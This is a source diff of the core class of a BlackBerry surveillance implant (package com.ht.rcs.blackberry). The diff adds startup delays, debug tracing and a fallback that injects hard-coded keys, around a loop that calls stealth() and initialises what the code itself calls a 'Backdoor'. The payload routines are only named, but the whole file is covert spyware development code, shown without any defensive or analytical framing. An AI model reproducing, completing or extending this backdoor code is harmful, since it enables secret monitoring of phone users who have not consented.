@@ -8,6 +8,8 @@
 
 package com.ht.rcs.blackberry;
 
+import com.ht.rcs.blackberry.config.InstanceKeys323;
+import com.ht.rcs.blackberry.config.Keys;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
@@ -18,7 +20,7 @@ import com.ht.rcs.blackberry.utils.Utils;
 public class Core {
 
     /** The debug. */
-    private static Debug debug = new Debug("Core", DebugLevel.VERBOSE);
+    private static Debug debug;
 
     /**
      * Lib main.
@@ -27,8 +29,16 @@ public class Core {
      *            the args
      */
     public static void libMain(final String[] args) {
+        Utils.sleep(5000);
+
+        debug = new Debug("Core", DebugLevel.VERBOSE);
         debug.init(true, false, true);
         debug.trace("RCSBlackBerry launching");
+
+        if (!Keys.hasBeenBinaryPatched()) {
+            debug.warn("Not binary patched, injecting 323");
+            InstanceKeys323.injectKeys323();
+        }
 
         Core core = new Core();
         boolean ret = core.run();
@@ -40,27 +50,18 @@ public class Core {
     private Task taskObj = new Task();
 
     /**
-     * Gets the my name.
-     */
-    private void getMyName() {
-        // TODO Auto-generated method stub
-
-    }
-
-    /**
      * Run.
      * 
      * @return true, if successful
      */
     public final boolean run() {
-        Utils.sleep(500);
 
-        getMyName();
         stealth();
 
         Utils.sleep(5000);
 
         for (;;) {
+            debug.info("init task");
             if (taskObj.taskInit() == false) {
                 debug.error("TaskInit() FAILED");
                 Msg.demo("Backdoor Init... FAILED");
@@ -73,6 +74,7 @@ public class Core {
                 Msg.show();
             }
 
+            debug.info("starting checking actions");
             if (taskObj.checkActions() == false) {
                 debug.error("CheckActions() [Uninstalling?] FAILED");
 
